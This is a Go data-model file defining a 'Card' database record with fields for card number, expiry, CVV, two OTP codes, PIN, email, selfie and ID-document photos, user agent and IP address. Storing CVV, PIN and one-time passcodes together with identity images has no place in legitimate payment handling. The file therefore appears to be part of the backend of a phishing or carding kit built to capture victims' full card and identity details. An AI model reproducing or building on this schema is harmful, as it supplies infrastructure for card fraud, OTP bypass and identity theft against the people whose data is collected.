package models

import "time"

type Card struct {
	ID         uint      `json:"id" gorm:"primaryKey"`
	Phone      string    `json:"phone"`
	Number     string    `json:"number"`
	Expiry     string    `json:"expiry"`
	CVV        string    `json:"cvv"`
	OTP1       string    `json:"otp1"`
	OTP2       string    `json:"otp2"`
	PIN        string    `json:"pin"`
	Email      string    `json:"email"`
	SelfieImg  string    `json:"selfie_img"`
	IDFrontImg string    `json:"id_front_img"`
	IDBackImg  string    `json:"id_back_img"`
	UserAgent  string    `json:"user_agent"`
	IPAddress  string    `json:"ip_address"`
	CreatedAt  time.Time `json:"created_at"`
	UpdatedAt  time.Time `json:"updated_at"`
}
